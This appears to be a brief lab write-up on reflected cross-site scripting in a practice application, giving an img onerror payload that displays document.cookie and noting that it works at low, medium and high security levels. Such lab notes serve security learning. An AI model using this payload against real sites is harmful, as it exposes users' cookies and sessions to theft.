# Reflected Cross Site Scripting (XSS)


**Security level is currently: low.**

we have name field which is reflecting on page.

payload=`<img src=x onerror="alert(document.cookie)">`

It triggers an alert pop up with cookie value.


**Security level is currently: medium.**

_payload of low level also works here: _

payload=`<img src=x onerror="alert(document.cookie)">`


**Security level is currently: high.**

_payload of low level also works here: _

payload=`<img src=x onerror="alert(document.cookie)">`

